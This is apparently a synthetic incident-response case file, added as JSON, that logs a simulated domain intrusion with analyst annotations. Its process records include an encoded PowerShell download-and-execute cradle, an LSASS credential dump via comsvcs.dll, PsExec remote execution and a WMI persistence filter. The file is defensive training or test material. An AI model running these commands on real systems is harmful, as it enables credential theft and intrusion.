@@ -1,0 +1,284 @@
+{
+  "case_id": "IR-2024-003",
+  "incident_type": "suspected_apt_lateral_movement",
+  "artifacts": {
+    "process_tree": [
+      {
+        "timestamp": "2024-03-10T03:05:22Z",
+        "pid": 7812,
+        "parent_pid": 1024,
+        "process_name": "wmiprvse.exe",
+        "command_line": "C:\\Windows\\System32\\wbem\\wmiprvse.exe -secured -Embedding",
+        "user": "NT AUTHORITY\\NETWORK SERVICE",
+        "host": "DC01.corp.acme.local"
+      },
+      {
+        "timestamp": "2024-03-10T03:05:24Z",
+        "pid": 7920,
+        "parent_pid": 7812,
+        "process_name": "powershell.exe",
+        "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADEALgA1ADoAOAAwADgAMAAvAHMAJwApAA==",
+        "user": "CORP\\svc_deploy",
+        "host": "DC01.corp.acme.local"
+      },
+      {
+        "timestamp": "2024-03-10T03:12:45Z",
+        "pid": 8344,
+        "parent_pid": 2100,
+        "process_name": "adfind.exe",
+        "command_line": "adfind.exe -f \"(objectcategory=computer)\" -csv name operatingSystem lastLogonTimestamp",
+        "user": "CORP\\svc_deploy",
+        "host": "WKS042.corp.acme.local"
+      },
+      {
+        "timestamp": "2024-03-10T03:18:33Z",
+        "pid": 9102,
+        "parent_pid": 2100,
+        "process_name": "psexec.exe",
+        "command_line": "psexec.exe \\\\FILESRV01 -accepteula -s cmd.exe /c \"whoami && ipconfig /all\"",
+        "user": "CORP\\svc_deploy",
+        "host": "WKS042.corp.acme.local"
+      },
+      {
+        "timestamp": "2024-03-10T03:22:10Z",
+        "pid": 9450,
+        "parent_pid": 9102,
+        "process_name": "rundll32.exe",
+        "command_line": "rundll32.exe C:\\Windows\\Temp\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\debug.bin full",
+        "user": "NT AUTHORITY\\SYSTEM",
+        "host": "FILESRV01.corp.acme.local"
+      },
+      {
+        "timestamp": "2024-03-10T03:30:05Z",
+        "pid": 3200,
+        "parent_pid": 788,
+        "process_name": "mmc.exe",
+        "command_line": "\"C:\\Windows\\System32\\mmc.exe\" \"C:\\Windows\\System32\\dsa.msc\"",
+        "user": "CORP\\admin.jthompson",
+        "host": "ADMIN-WKS01.corp.acme.local"
+      }
+    ],
+    "network_logs": [
+      {
+        "timestamp": "2024-03-10T03:04:58Z",
+        "src_ip": "10.0.2.42",
+        "dst_ip": "10.0.1.10",
+        "dst_port": 445,
+        "protocol": "SMB",
+        "bytes_sent": 1248,
+        "bytes_received": 4096,
+        "domain": null,
+        "auth_type": "NTLM",
+        "logon_type": 3,
+        "description": "Network logon from WKS042 to DC01 using NTLM (Pass-the-Hash indicator)"
+      },
+      {
+        "timestamp": "2024-03-10T03:05:20Z",
+        "src_ip": "10.0.2.42",
+        "dst_ip": "10.0.1.10",
+        "dst_port": 135,
+        "protocol": "DCOM/WMI",
+        "bytes_sent": 2048,
+        "bytes_received": 512,
+        "domain": null,
+        "description": "WMI remote execution via DCOM from WKS042 to DC01"
+      },
+      {
+        "timestamp": "2024-03-10T03:12:30Z",
+        "src_ip": "10.0.2.42",
+        "dst_ip": "10.0.1.10",
+        "dst_port": 389,
+        "protocol": "LDAP",
+        "bytes_sent": 45200,
+        "bytes_received": 2340000,
+        "domain": null,
+        "description": "High-volume LDAP queries from single workstation - 847 queries in 90 seconds"
+      },
+      {
+        "timestamp": "2024-03-10T03:25:00Z",
+        "src_ip": "10.0.2.42",
+        "dst_ip": "198.51.100.77",
+        "dst_port": 443,
+        "protocol": "HTTPS",
+        "bytes_sent": 256,
+        "bytes_received": 48,
+        "domain": "micros0ft-update.com",
+        "description": "Regular interval HTTPS beacon (every 60s ±5s jitter) to typosquat domain"
+      },
+      {
+        "timestamp": "2024-03-10T03:25:59Z",
+        "src_ip": "10.0.2.42",
+        "dst_ip": "198.51.100.77",
+        "dst_port": 443,
+        "protocol": "HTTPS",
+        "bytes_sent": 256,
+        "bytes_received": 48,
+        "domain": "micros0ft-update.com",
+        "description": "C2 beacon - consistent payload size suggests heartbeat/polling"
+      },
+      {
+        "timestamp": "2024-03-10T03:08:15Z",
+        "src_ip": "10.0.2.42",
+        "dst_ip": "10.0.1.10",
+        "dst_port": 88,
+        "protocol": "Kerberos",
+        "bytes_sent": 1580,
+        "bytes_received": 2200,
+        "domain": "corp.acme.local",
+        "description": "Kerberos TGT request with anomalous ticket lifetime of 87600 hours (10 years) - Golden Ticket indicator"
+      }
+    ],
+    "file_events": [
+      {
+        "timestamp": "2024-03-10T03:14:02Z",
+        "action": "create",
+        "path": "C:\\Users\\svc_deploy\\AppData\\Local\\Temp\\computers.json",
+        "size_bytes": 1245000,
+        "hash_sha256": "a3f2b8c91d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a",
+        "host": "WKS042.corp.acme.local"
+      },
+      {
+        "timestamp": "2024-03-10T03:14:05Z",
+        "action": "create",
+        "path": "C:\\Users\\svc_deploy\\AppData\\Local\\Temp\\users.json",
+        "size_bytes": 3890000,
+        "hash_sha256": "b4c3d9e02f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1",
+        "host": "WKS042.corp.acme.local"
+      },
+      {
+        "timestamp": "2024-03-10T03:18:40Z",
+        "action": "create",
+        "path": "C:\\Windows\\PSEXESVC.exe",
+        "size_bytes": 348160,
+        "hash_sha256": "e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8",
+        "host": "FILESRV01.corp.acme.local"
+      },
+      {
+        "timestamp": "2024-03-10T03:22:45Z",
+        "action": "create",
+        "path": "C:\\Windows\\Temp\\debug.bin",
+        "size_bytes": 58720256,
+        "hash_sha256": "c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
+        "host": "FILESRV01.corp.acme.local",
+        "description": "LSASS memory dump output (56MB - consistent with credential extraction)"
+      },
+      {
+        "timestamp": "2024-03-10T03:35:12Z",
+        "action": "modify",
+        "path": "D:\\SharedDocs\\Q1-2024-Financial-Report.xlsx",
+        "size_bytes": 2450000,
+        "hash_sha256": "f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0",
+        "host": "FILESRV01.corp.acme.local",
+        "description": "Legitimate file access by finance team member during scheduled batch process"
+      }
+    ],
+    "registry_changes": [
+      {
+        "timestamp": "2024-03-10T03:18:38Z",
+        "action": "set_value",
+        "key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\PSEXESVC",
+        "value_name": "ImagePath",
+        "value_data": "C:\\Windows\\PSEXESVC.exe",
+        "host": "FILESRV01.corp.acme.local",
+        "description": "PsExec service binary installed on remote host"
+      },
+      {
+        "timestamp": "2024-03-10T03:10:44Z",
+        "action": "set_value",
+        "key": "HKLM\\SOFTWARE\\Microsoft\\Wbem\\ESS\\//./root/subscription\\__EventFilter",
+        "value_name": "WMI_Persistence_Filter",
+        "value_data": "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
+        "host": "DC01.corp.acme.local",
+        "description": "WMI event subscription for persistence - triggers every 60 seconds"
+      },
+      {
+        "timestamp": "2024-03-10T03:40:22Z",
+        "action": "set_value",
+        "key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security",
+        "value_name": "MaxSize",
+        "value_data": "1048576",
+        "host": "DC01.corp.acme.local",
+        "description": "Security event log max size reduced from 128MB to 1MB - likely to force log rotation and evidence destruction"
+      }
+    ],
+    "auth_logs": [
+      {
+        "timestamp": "2024-03-10T03:04:55Z",
+        "event_type": "logon_success",
+        "event_id": 4624,
+        "username": "CORP\\svc_deploy",
+        "source_ip": "10.0.2.42",
+        "destination_host": "DC01.corp.acme.local",
+        "logon_type": 3,
+        "auth_package": "NTLM",
+        "description": "Network logon using NTLM from workstation - Pass-the-Hash indicator (service account should use Kerberos)"
+      },
+      {
+        "timestamp": "2024-03-10T03:08:12Z",
+        "event_type": "kerberos_tgt_request",
+        "event_id": 4768,
+        "username": "CORP\\krbtgt",
+        "source_ip": "10.0.2.42",
+        "destination_host": "DC01.corp.acme.local",
+        "logon_type": 3,
+        "ticket_lifetime_hours": 87600,
+        "description": "Kerberos TGT with 10-year lifetime - Golden Ticket forged offline (normal max is 10 hours)"
+      },
+      {
+        "timestamp": "2024-03-10T03:00:10Z",
+        "event_type": "logon_failure",
+        "event_id": 4625,
+        "username": "CORP\\admin.jthompson",
+        "source_ip": "10.0.2.42",
+        "destination_host": "DC01.corp.acme.local",
+        "logon_type": 3,
+        "failure_reason": "Unknown user name or bad password",
+        "description": "Failed logon attempt 1 of 4 - credential testing"
+      },
+      {
+        "timestamp": "2024-03-10T03:00:12Z",
+        "event_type": "logon_failure",
+        "event_id": 4625,
+        "username": "CORP\\admin.jthompson",
+        "source_ip": "10.0.2.42",
+        "destination_host": "DC01.corp.acme.local",
+        "logon_type": 3,
+        "failure_reason": "Unknown user name or bad password",
+        "description": "Failed logon attempt 2 of 4 - credential testing"
+      },
+      {
+        "timestamp": "2024-03-10T03:00:14Z",
+        "event_type": "logon_failure",
+        "event_id": 4625,
+        "username": "CORP\\admin.jthompson",
+        "source_ip": "10.0.2.42",
+        "destination_host": "DC01.corp.acme.local",
+        "logon_type": 3,
+        "failure_reason": "Unknown user name or bad password",
+        "description": "Failed logon attempt 3 of 4 - credential testing"
+      },
+      {
+        "timestamp": "2024-03-10T03:00:16Z",
+        "event_type": "logon_success",
+        "event_id": 4624,
+        "username": "CORP\\admin.jthompson",
+        "source_ip": "10.0.2.42",
+        "destination_host": "DC01.corp.acme.local",
+        "logon_type": 3,
+        "auth_package": "NTLM",
+        "description": "Successful logon after 3 failures - credential testing succeeded"
+      },
+      {
+        "timestamp": "2024-03-10T03:17:50Z",
+        "event_type": "logon_success",
+        "event_id": 4624,
+        "username": "CORP\\svc_deploy",
+        "source_ip": "10.0.5.200",
+        "destination_host": "FILESRV01.corp.acme.local",
+        "logon_type": 3,
+        "auth_package": "NTLM",
+        "description": "Service account svc_deploy used from unexpected source 10.0.5.200 (normally only seen from 10.0.1.50 deployment server)"
+      }
+    ]
+  }
+}
